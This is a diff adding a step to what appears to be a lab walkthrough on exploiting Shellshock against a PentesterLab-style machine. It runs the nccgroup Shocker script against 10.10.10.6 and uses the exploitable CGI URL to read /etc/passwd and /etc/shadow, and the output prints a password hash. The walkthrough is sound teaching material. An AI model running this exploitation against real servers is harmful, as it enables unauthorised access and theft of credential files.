@@ -81,5 +81,54 @@ Lets Scan the HTTP
 We have Found ourself a way in **shellshock**
 
 now there are multiple of ways to do it 
-Either use Metasploit Shellshock or Exploit db Shellshock or there is a Script Called Shocker on Github can be found on this link 
+Either use Metasploit Shellshock or Exploit db Shellshock or there is a Script Called Shocker on Github can be found on this link https://github.com/nccgroup/shocker
+
+I like to use Shocker Script by **nccgroup**
+
+so lets give it a try 
+```shell
+┌─[micr0b0t@parrot]─[~/Desktop/SalusLab/exploits/shocker]
+└──╼ $python shocker.py -H 10.10.10.6
+
+   .-. .            .            
+  (   )|            |            
+   `-. |--. .-.  .-.|.-. .-. .--.
+  (   )|  |(   )(   |-.'(.-' |   
+   `-' '  `-`-'  `-''  `-`--''  v1.0 
+   
+ Tom Watson, tom.watson@nccgroup.trust
+ https://www.github.com/nccgroup/shocker
+     
+ Released under the GNU Affero General Public License
+ (https://www.gnu.org/licenses/agpl-3.0.html)
+    
+    
+[+] 402 potential targets imported from ./shocker-cgi_list
+[+] Checking connectivity with target...
+[+] Target was reachable
+[+] Looking for vulnerabilities on 10.10.10.6:80
+[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>] (402/402)
+
+[+] 2 potential targets found, attempting exploits
+[+] The following URLs appear to be exploitable:
+  [1] http://10.10.10.6:80/cgi-bin/status
+[+] Would you like to exploit further?
+[>] Enter an URL number or 0 to exit: 1
+[+] Entering interactive mode for http://10.10.10.6:80/cgi-bin/status
+[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'
+  > /bin/cat /etc/passwd
+  < root:x:0:0:root:/root:/bin/sh
+  < lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+  < nobody:x:65534:65534:nobody:/nonexistent:/bin/false
+  < tc:x:1001:50:Linux User,,,:/home/tc:/bin/sh
+  < pentesterlab:x:1000:50:Linux User,,,:/home/pentesterlab:/bin/sh
+  > /bin/cat /etc/shadow
+  < root:*:13525:0:99999:7:::
+  < lp:*:13510:0:99999:7:::
+  < nobody:*:13509:0:99999:7:::
+  < tc::13646:0:99999:7:::
+  < pentesterlab:$1$X2ZTlPU8$kik70LYKJstA05jp2aLnY/:17486:0:99999:7:::
+```
+and we have what we need the shadow and passwd 
+
 
